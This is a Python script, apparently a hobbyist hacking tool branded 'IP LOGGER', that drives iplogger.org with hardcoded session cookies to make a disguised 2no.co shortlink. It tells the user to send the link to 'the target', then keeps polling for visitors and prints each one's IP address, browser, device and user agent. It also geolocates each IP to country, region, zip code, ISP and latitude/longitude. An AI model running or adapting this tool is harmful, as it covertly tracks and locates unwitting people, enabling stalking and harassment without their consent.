import secrets
import random
from time import sleep
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
RESET = '\033[0m'
print(f'''{GREEN}

 ██▓ ██▓███      ██▓     ▒█████    ▄████   ▄████ ▓█████  ██▀███  
▓██▒▓██░  ██▒   ▓██▒    ▒██▒  ██▒ ██▒ ▀█▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
▒██▒▓██░ ██▓▒   ▒██░    ▒██░  ██▒▒██░▄▄▄░▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
░██░▒██▄█▓▒ ▒   ▒██░    ▒██   ██░░▓█  ██▓░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
░██░▒██▒ ░  ░   ░██████▒░ ████▓▒░░▒▓███▀▒░▒▓███▀▒░▒████▒░██▓ ▒██▒
░▓  ▒▓▒░ ░  ░   ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒ ░░▒ ░        ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░   ░   ░  ░ ░  ░  ░▒ ░ ▒░
 ▒ ░░░            ░ ░   ░ ░ ░ ▒  ░ ░   ░ ░ ░   ░    ░     ░░   ░ 
 ░                  ░  ░    ░ ░        ░       ░    ░  ░   ░     
                                                                 
     {RED} IG:FX_PY3                          T.ME:FX_PY              
      
      ''')
url_target=input(RESET+f'[{YELLOW}+{RESET}] - Enter the link you want to shorten : ')
confirmations=['oVBisa48957C0BR3FSHEaWWoF5LtZED4','rLB8IBIKUuwXYCQMrBCzRs4Vcm6YI5io','Khi6ZM42IWZS1rLlxrXK7P5nU77jvtLe','Vc6Q2jB5RFSdaVvCHlYCpKLdJYK9cdiD','51Pey8SD3E7Vq2rPnOBPOX6i3WmS7lhU','cmoFPcUHbIXf2044251SCMlM','vhj1CUsFzrxYBHqQH1inwWMs57YBNjXm','qBPhm33P0Dbzpp9px5ytd58b7zHLV7lF','FqFIfEJlay8EbDaUrti4X8CsrnwSJ2y9','olMB2rIVaXSRqKvaqzvBQPPLhxXcqmZH','m288DhKWj4o4BeOwyUXXe9yO3Np54Xsr']
confirmation=random.choice(confirmations)
for i in range(0,6):
    try:
        headers={
        'Cookie': f'375263813869706608=3; cookies-consent=1681911304; confirmation={confirmation}; clhf03028ja=104.243.212.47; 375263811760810031=2; cursor=yWlDv0C0j60002E2O7l9D601akLxepAX; _ga=GA1.2.{secrets.token_hex(9)}.{secrets.token_hex(10)}; cto_bundle={secrets.token_hex(9)*5}; loggers=eG5UazRwdk10bEVyLDlrVGs0bUUyRkxzQyxMalRrNGw0eE1yV3oseGRUazQzdlduMERlLExDaWs0aGxzS1JMdyxuQ2lrNDc4WDFlWkUsczM0MTRUZHdzcW5uLE0yNDE0UkszMzh4UA%3D%3D; _gat_gtag_UA_67516667_1=1; turnback=logger%2FxnTk4pvMtlEr%2F; __gads=ID={secrets.token_hex(16)}-{secrets.token_hex(16)}:T={secrets.token_hex(10)}:S=ALNI_MYW-{secrets.token_hex(25)}; __gpi=UID=00000c067042987c:T=1681910959:RT=1697222398:S=ALNI_MZGEdRfPY5ppKzmj0zxPjiEFfo5Kg; integrity=DWqpRE0mlSmL4KFVIyULTntM; _ga_7FSG7D195N=GS1.1.1697220603.2.1.1697222401.54.0.0; _ga=GA1.2.18843998.1681910958',
        'Origin': 'https://iplogger.org',
        'Referer': 'https://iplogger.org/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'X-Requested-With':'XMLHttpRequest'}


        data={
            'destination': url_target
        }
        url = 'https://iplogger.org/create/shortlink/'
        import requests
        response=requests.post(url,headers=headers,data=data).json()
        go=(response['go'].split('/logger/')[1])
        link=go.split('/')[0]
        code_url1=link
        break
    except:
        confirmation=random.choice(confirmations)
        continue
        
        
    


url1='https://iplogger.org/logger/'+link
headers1={
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
    'Sec-Ch-Ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'Cookie':  f'375263813158706608=3; cookies-consent=1681911304; confirmation={confirmation}; clhf03028ja=104.243.212.47; 375263811760810031=2; cursor=yWlDv0C0j60002E2O7l9D601akLxepAX; _ga=GA1.2.{secrets.token_hex(9)}.{secrets.token_hex(10)}; cto_bundle={secrets.token_hex(9)*5}; loggers=eG5UazRwdk10bEVyLDlrVGs0bUUyRkxzQyxMalRrNGw0eE1yV3oseGRUazQzdlduMERlLExDaWs0aGxzS1JMdyxuQ2lrNDc4WDFlWkUsczM0MTRUZHdzcW5uLE0yNDE0UkszMzh4UA%3D%3D; _gat_gtag_UA_67516667_1=1; turnback=logger%2FxnTk4pvMtlEr%2F; __gads=ID={secrets.token_hex(16)}-{secrets.token_hex(16)}:T={secrets.token_hex(10)}:S=ALNI_MYW-{secrets.token_hex(25)}; __gpi=UID=00000c067042987c:T=1681910959:RT=1697222398:S=ALNI_MZGEdRfPY5ppKzmj0zxPjiEFfo5Kg; integrity=DWqpRE0mlSmL4KFVIyULTntM; _ga_7FSG7D195N=GS1.1.1697220603.2.1.1697222401.54.0.0; _ga=GA1.2.18843998.1681910958',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
}
res=requests.get(url1,headers=headers1).text
code1=(res.split('		<button data-name="share" data-dialog="logger-share" data-shortlink-place="share" data-shortlink="')[1])
code=code1.split('" data-prepare="share"')[0]
code_url2=code.split('/')[3]







res2=requests.post('https://iplogger.org/logger/update/',headers={
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
    'Sec-Ch-Ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
    'Sec-Ch-Ua-Mobile':'?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Origin': 'https://iplogger.org' ,
    'Referer': 'https://iplogger.org/logger/'+code_url1,
    'Content-Length': '60',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Upgrade-Insecure-Requests': '1',
    'Cookie':  f'375263813158706608=3; cookies-consent=1681911304; confirmation={confirmation}; clhf03028ja=104.243.212.47; 375263811760810031=2; cursor=yWlDv0C0j60002E2O7l9D601akLxepAX; _ga=GA1.2.{secrets.token_hex(9)}.{secrets.token_hex(10)}; cto_bundle={secrets.token_hex(9)*5}; loggers=eG5UazRwdk10bEVyLDlrVGs0bUUyRkxzQyxMalRrNGw0eE1yV3oseGRUazQzdlduMERlLExDaWs0aGxzS1JMdyxuQ2lrNDc4WDFlWkUsczM0MTRUZHdzcW5uLE0yNDE0UkszMzh4UA%3D%3D; _gat_gtag_UA_67516667_1=1; turnback=logger%2FxnTk4pvMtlEr%2F; __gads=ID={secrets.token_hex(16)}-{secrets.token_hex(16)}:T={secrets.token_hex(10)}:S=ALNI_MYW-{secrets.token_hex(25)}; __gpi=UID=00000c067042987c:T=1681910959:RT=1697222398:S=ALNI_MZGEdRfPY5ppKzmj0zxPjiEFfo5Kg; integrity=DWqpRE0mlSmL4KFVIyULTntM; _ga_7FSG7D195N=GS1.1.1697220603.2.1.1697222401.54.0.0; _ga=GA1.2.18843998.1681910958',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest'

},data={
'code': code_url1,
'name': 'shortlink',
'domain': '2no.co',
'manual': code_url2}).text
print(RESET+f'[{RED}-{RESET}] = This is the link you send to the target ==>> https://2no.co/'+code_url2 )
ips=[]
address=''
while True:
        sleep(5)
        url1='https://iplogger.org/logger/'
        headers1={
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
            'Sec-Ch-Ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Origin': 'https://iplogger.org', 
            'Referer': 'https://iplogger.org/logger/'+code_url1,
            'Upgrade-Insecure-Requests': '1',
            'Cookie': f'375263813158706608=3; cookies-consent=1681911304; confirmation={confirmation}; clhf03028ja=104.243.212.47; 375263811760810031=2; cursor=yWlDv0C0j60002E2O7l9D601akLxepAX; _ga=GA1.2.{secrets.token_hex(9)}.{secrets.token_hex(10)}; cto_bundle={secrets.token_hex(9)*5}; loggers=eG5UazRwdk10bEVyLDlrVGs0bUUyRkxzQyxMalRrNGw0eE1yV3oseGRUazQzdlduMERlLExDaWs0aGxzS1JMdyxuQ2lrNDc4WDFlWkUsczM0MTRUZHdzcW5uLE0yNDE0UkszMzh4UA%3D%3D; _gat_gtag_UA_67516667_1=1; turnback=logger%2FxnTk4pvMtlEr%2F; __gads=ID={secrets.token_hex(16)}-{secrets.token_hex(16)}:T={secrets.token_hex(10)}:S=ALNI_MYW-{secrets.token_hex(25)}; __gpi=UID=00000c067042987c:T=1681910959:RT=1697222398:S=ALNI_MZGEdRfPY5ppKzmj0zxPjiEFfo5Kg; integrity=DWqpRE0mlSmL4KFVIyULTntM; _ga_7FSG7D195N=GS1.1.1697220603.2.1.1697222401.54.0.0; _ga=GA1.2.18843998.1681910958',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'
        }
        res=requests.post(url1,headers=headers1,data={
'interval': 'all',
'filters': '',
'page': '1',
'sort': 'ip',
'order': 'desc',
'code': code_url1}).json()['content']
        for i in res:
            if address in ips :
                    pass
            else:
                    date=i.split('<div class="ip-date">')[1]
                    date=date.split('</div>')[0]
                    
                    time=i.split('<div class="ip-time">')[1]
                    time=time.split('</div>')[0]
                    
                    address=i.split('<div class="ip-address">')[1]
                    address=address.split('</div>')[0]
                    
                    platform=i.split('<div class="platform" data-icon=')[1]
                    platform=platform.split('<span>')[1]
                    platform=platform.split('</span>')[0]
                    
                    browser=i.split('<div class="browser" data-icon=')[1]
                    browser=browser.split('<span>')[1]
                    browser=browser.split('</span>')[0]
                    
                    
                    
                    useragent=i.split('class="visitor-useragent"><div>')[1]
                    useragent=useragent.split('</div>')[0]
                    print('\n'*3)
                    print(YELLOW+'-----------------------------------------')
                    print(RESET+'address : '+address)
                    print(RESET+'browser : ' +browser)
                    print(RESET+'device : '+platform)
                    print(RESET+'time : '+time)
                    print(RESET+'date : '+date)
                    print(RESET+'useragent : '+useragent)
                    print(YELLOW+'=====================================')
                    print(YELLOW+'============== IP INFO ==============')
                    res_ip=requests.get('http://ip-api.com/json/'+address).json()
                    print(RESET+'country : '+str(res_ip['country']))
                    print(RESET+'regionName : '+str(res_ip['regionName']))
                    print(RESET+'zip : '+str(res_ip['zip']))
                    print(RESET+'timezone : '+str(res_ip['timezone']))
                    print(RESET+'as : '+str(res_ip['as']))
                    lat=str(res_ip['lat'])
                    lon=str(res_ip['lon'])
                    print(RESET+'location : '+lat+', '+lon)
                    print(YELLOW+'-----------------------------------------')
                    ips.append(address)
